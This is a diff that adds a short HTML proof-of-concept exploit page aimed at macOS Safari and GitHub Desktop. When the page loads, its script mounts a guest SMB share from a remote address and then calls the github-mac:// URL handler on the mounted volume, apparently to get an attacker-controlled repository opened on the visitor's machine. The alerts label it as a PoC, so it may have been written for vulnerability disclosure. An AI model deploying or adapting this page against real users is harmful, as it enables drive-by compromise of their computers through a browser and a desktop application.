@@ -1,0 +1,22 @@
+<body>
+    <script>
+        // Start a public smb share before trying this
+        // specify pass/user so that macOS doesn't prompt us
+        var SHARE_ADDRESS = "smb://guest:guest@10.211.55.5"
+        var PATH_TO_DIR_SHARE = "public/e2"
+
+        function samba() {
+            location.href = SHARE_ADDRESS
+        }
+
+        window.onload = () => {
+            alert("Do you want to see SMB:// PoC?")
+            samba()
+            // wait a bit... let Safari unpack the archive
+            setTimeout(() => {
+                alert("Click 'Yes' on the next window for PoC")
+                location.href = `github-mac://openlocalrepo//Volumes/${PATH_TO_DIR_SHARE}`
+            },3000)
+        }
+    </script>
+</body>
